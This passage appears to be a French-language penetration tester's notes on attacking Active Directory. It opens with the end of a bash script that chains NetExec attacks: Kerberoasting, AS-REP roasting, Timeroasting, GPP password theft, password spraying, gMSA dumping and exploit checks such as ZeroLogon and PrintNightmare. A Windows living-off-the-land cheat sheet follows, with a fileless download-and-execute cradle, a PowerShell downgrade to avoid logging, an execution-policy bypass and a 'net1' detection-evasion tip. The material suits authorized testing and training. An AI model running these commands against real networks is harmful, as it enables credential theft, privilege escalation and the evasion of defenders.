		print_operators=$(ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "$base_dn" "(cn=Print Operators)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2)
		server_operators=$(ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "$base_dn" "(cn=Server Operators)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2)
		account_operators=$(ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "$base_dn" "(cn=Account Operators)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2)
		
	fi
	result
	echo -e $YELLOW"\nUsers with admin-count 1 : \n\n$PURPLE$admin_count_users\n" | tee privileged_users.txt
	echo -e $YELLOW"\nUsers who can PsRemote : \n\n$PURPLE$psremote_users\n$NOCOLOR" | tee -a privileged_users.txt
	echo -e $YELLOW"\nUsers who can RDP : \n\n$PURPLE$rdp_users\n$NOCOLOR" | tee -a privileged_users.txt
	echo -e $YELLOW"\nUsers who are SQL Admins : \n\n$PURPLE$sqladmin_users\n$NOCOLOR" | tee -a privileged_users.txt
	echo -e $YELLOW"\nUsers who are Backup Operators : \n\n$PURPLE$backup_operators\n$NOCOLOR" | tee -a privileged_users.txt
	echo -e $YELLOW"\nUsers who are Event Log Readers : \n\n$PURPLE$event_log_readers\n$NOCOLOR" | tee -a privileged_users.txt
	echo -e $YELLOW"\nUsers who are Dns Admins : \n\n$PURPLE$dns_admins\n$NOCOLOR" | tee -a privileged_users.txt
	echo -e $YELLOW"\nUsers who are Hyper-V Admins : \n\n$PURPLE$hyperv_admins\n$NOCOLOR" | tee -a privileged_users.txt
	echo -e $YELLOW"\nUsers who are Print Operators : \n\n$PURPLE$print_operators\n$NOCOLOR" | tee -a privileged_users.txt
	echo -e $YELLOW"\nUsers who are Server Operators : \n\n$PURPLE$server_operators\n$NOCOLOR" | tee -a privileged_users.txt
	echo -e $YELLOW"\nUsers who are Account Operators : \n\n$PURPLE$account_operators\n$NOCOLOR" | tee -a privileged_users.txt
}

function get_DC_shares {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc smb $dc_hostname -u $user -p $password -k --shares | tee dc_shares.txt
	else
		nxc smb $dc_ip -u $user -p $password --shares | tee dc_shares.txt
	fi
	result
}

function kerberoasting {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc ldap $dc_hostname -u $user -p $password -k --kdcHost $dc_hostname --kerberoasting SPNs.txt
	else
		nxc ldap $dc_ip -u $user -p $password --kdcHost $dc_hostname --kerberoasting SPNs.txt
	fi
	result
	echo -e "$GREEN Kerberoastable users hashes collected in SPNs.txt if vulnerable.$NOCOLOR"
}

function asrep_roasting {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc ldap $dc_hostname -u ad_users.txt -p '' -k --kdcHost $dc_hostname --asreproast ASREP.txt
	else
		nxc ldap $dc_ip -u ad_users.txt -p '' --kdcHost $dc_hostname --asreproast ASREP.txt
	fi
	result
	echo -e "$GREEN AS-Reproastable users hashes collected in ASREP.txt if vulnerable.$NOCOLOR"
}

function timeroasting {
	nxc smb $dc_ip -M timeroast | grep 'sntp-ms' | cut -f2 -d":" | tee timeroast.hashes
	result
	echo -e "$GREEN Timeroast hashes collected in timeroast.hashes if vulnerable.$NOCOLOR"
}

function get_GPP_passwords {
	if [ $auth_protocol == "KERBEROS" ]
	then 
		nxc smb $dc_hostname -u $user -p $password -k -M gpp_password
		nxc smb $dc_hostname -u $user -p $password -k -M gpp_autologin
	else
		nxc smb $dc_ip -u $user -p $password -M gpp_password
		nxc smb $dc_hostname -u $user -p $password -k -M gpp_autologin
	fi	
	result
}

function get_password_policy {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc smb $dc_hostname -u $user -p $password -k --pass-pol | tee pass_pol.txt
	else
		nxc smb $dc_ip -u $user -p $password --pass-pol | tee pass_pol.txt
	fi
	result
}

function password_spraying {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc smb $dc_hostname -u ad_users.txt -p $password -k --kdcHost $dc_hostname --continue-on-success | grep +
	else
		nxc smb $dc_ip -u ad_users.txt -p $password --continue-on-success | grep +
	fi
	result
}

function get_gMSA {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc ldap $dc_hostname -u $user -p $password -k --gmsa | tee gMSA_accounts.txt
	else
		nxc ldap $dc_ip -u $user -p $password --gmsa | tee gMSA_accounts.txt
	fi
	result
}

function get_delegations {
	if [ $auth_protocol == "KERBEROS" ]
	then
		echo -e "$YELLOW Constrained Delegations :$NOCOLOR"
		nxc ldap $dc_hostname -u $user -p $password -k --find-delegation
		echo -e "$YELLOW Unconstrained Delegations :$NOCOLOR"
		nxc ldap $dc_hostname -u $user -p $password -k "--trusted-for-delegation"
	else
		echo -e "$YELLOW Constrained Delegations :$NOCOLOR"
		nxc ldap $dc_ip -u $user -p $password --find-delegation
		echo -e "$YELLOW Unconstrained Delegations :$NOCOLOR"
		nxc ldap $dc_ip -u $user -p $password "--trusted-for-delegation"
	fi
	result
}

function enum_AV {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc smb $dc_hostname -u $user -p $password -k -M enum_av
	else
		nxc smb $dc_ip -u $user -p $password -M enum_av
	fi
}

function cve_check {
	nxc smb 172.16.1.20 -u '' -p '' -d DANTE.LOCAL --dns-server 172.16.1.20 -M zerologon -M nopac -M printnightmare -M smbghost -M ms17-010 -M coerce_plus
	result
}


function main {
	echo -e "\n$CYAN --Synchronising clock with the DC...$NOCOLOR\n"
	clock_sync
	echo -e "\n$CYAN--Requesting kerberos ticket for $user...$NOCOLOR\n"
	get_TGT
	echo -e "\n$CYAN--Running Sharphound data collection...$NOCOLOR\n"
	collect_Bloodhound_data
	echo -e "\n$CYAN--Collecting users...$NOCOLOR\n"
	get_AD_users
	echo -e "\n$CYAN--Collecting groups...$NOCOLOR\n"
	get_AD_groups
	echo -e "\n$CYAN--Collecting computers...$NOCOLOR\n"
	get_AD_computers
	echo -e "\n$CYAN--Collecting users descriptions...$NOCOLOR\n"
	get_AD_users_desc
	echo -e "\n$CYAN--Identifying privileged users...$NOCOLOR\n"
	get_privileged_users
	echo -e "\n$CYAN--Retrieving DC shares...$NOCOLOR\n"
	get_DC_shares
	echo -e "\n$CYAN--Attempting Kerberoasting...$NOCOLOR\n"
	kerberoasting
	echo -e "\n$CYAN--Attempting ASREP-roasting...$NOCOLOR\n"
	asrep_roasting
	echo -e "\n$CYAN--Attempting Timeroasting...$NOCOLOR\n"
	timeroasting
	echo -e "\n$CYAN--Retrieving GPP passwords...$NOCOLOR\n"
	get_GPP_passwords
	echo -e "\n$CYAN--Getting the domain password policy...$NOCOLOR\n"
	get_password_policy
	echo -e "\n$CYAN--Spraying the given user's password...$NOCOLOR\n"
	password_spraying
	echo -e "\n$CYAN--Getting gMSA...$NOCOLOR\n"
	get_gMSA
	echo -e "\n$CYAN--Enumerating delegations...$NOCOLOR\n"
	get_delegations
	echo -e "\n$CYAN--Enumerating installed AV...$NOCOLOR\n"
	enum_AV
	echo -e "\n$GREEN--Enumeration fully completed, have fun ;)"
}

main
```



---
---


# ENUMERATION SANS TOOLS (Living Off the Land)


# 1. SYSTEMINFO

Récupère toutes les infos système suivantes

```cmd
systeminfo
```

## Identifier le hostname

```
hostname
```

## Identifier le user actuel

```
whoami
```

## Identifier les privilèges du user actuel

```
whoami /priv
```


## Identifier les groupes auxquels appartient user actuel

```
whoami /groups
```


## Afficher la version de l'OS

```powershell
[System.Environment]::OSVersion.Version
```

## Afficher les patchs installés

```powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

## Afficher la config IP

```powershell
ipconfig /all
```

## Afficher les variables d'environnement (cmd)

```cmd
set
```

## Afficher le domain (cmd)

```cmd
echo %USERDOMAIN%
```

## Afficher le DC sur lequel le user est co (cmd)

```cmd
echo %logonserver%
```

## Voir les sessions

```powershell-session
qwinsta
```


# 2. Commandes PowerShell intéressantes


## Lister les modules

```
Get-Module
```

## Afficher la politique d'exécution des scripts

```
Get-ExecutionPolicy -List
```

## Changer la politique d'exécution des scripts

```
Set-ExecutionPolicy Bypass -Scope Process
```

## Afficher les variables d'environnement

```cmd
Get-ChildItem Env: | ft Key,Value
```

## Afficher l'historique de commandes PowerShell

```
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```

## Charger script en mémoire #Fileless

```
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
```


## Downgrade version powershell (pas de logs dans event-viewr)


```powershell-session
powershell.exe -version 2
```

# 3. Identifier les contrôles de sécurité


## Check du firewall

```powershell-session
netsh advfirewall show allprofiles
```

## Check si Defender tourne (cmd)

```cmd-session
sc query windefend
```

## Check de la conf de Defender (powershell)

```powershell-session
Get-MpComputerStatus
```

## Check si AV Tiers installé (powershell)

```
Get-CimInstance -Namespace root/SecurityCenter2 -Classname AntiVirusProduct
```


# 4. Identifier la config réseau


## Table ARP

```
arp -a
```

## Cartes réseau et @IP

```
ipconfig /all
```

## Routes

```
route print
```



# 5. WMI Checks

## Afficher infos system basiques

```
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
```

## Afficher les process qui tournent

```
wmic process list /format:list
```

## Afficher les infos sur le contrôleur de domaine

```
wmic ntdomain list /format:list
```

## Afficher les infos sur les comptes de domaines et locaux qui se sont connectés sur la machine

```
wmic useraccount list /format:list
```

## Afficher les informations sur les groupes locaux

```
wmic group list /format:list
```

## Afficher les informations sur les comptes SYSTEM

```
wmic sysaccount list /format:list
```


# 6. NET COMMANDS

> [!TIP]
> Taper net1 au lieu de net pour detection evasion

| **Command**                                     | **Description**                                                                                                              |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `net accounts`                                  | Information about password requirements                                                                                      |
| `net accounts /domain`                          | Password and lockout policy                                                                                                  |
| `net group /domain`                             | Information about domain groups                                                                                              |
| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                      |
| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                          |
| `net group "Domain Controllers" /domain`        | List PC accounts of domains controllers                                                                                      |
| `net group <domain_group_name> /domain`         | User that belongs to the group                                                                                               |
| `net groups /domain`                            | List of domain groups                                                                                                        |
| `net localgroup`                                | All available groups                                                                                                         |
| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
| `net localgroup Administrators`                 | Information about a group (admins)                                                                                           |
| `net localgroup administrators [username] /add` | Add user to administrators                                                                                                   |
| `net share`                                     | Check current shares                                                                                                         |
| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                               |
| `net user /domain`                              | List all users of the domain                                                                                                 |
| `net user %username%`                           | Information about the current user                                                                                           |
| `net use x: \computer\share`                    | Mount the share locally                                                                                                      |
| `net view`                                      | Get a list of computers                                                                                                      |
| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                        |
| `net view \computer /ALL`                       | List shares of a computer                                                                                                    |
| `net view /domain`                              | List of PCs of the domain                                                                                                    |

# 7. DSQUERY (SYSTEM PRIV)


## Afficher les users du domaine

```powershell-session
dsquery user
```

## Afficher les machines du domaine

```powershell-session
dsquery computer
```

## Afficher tous les objets d'une OU

```powershell-session
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

## Identifier les users ayant un mot de passe vide

```powershell-session
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

## Afficher tous les contrôleurs de domaine

```powershell-session
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -attr sAMAccountName
```

[[REQUETES LDAP]]



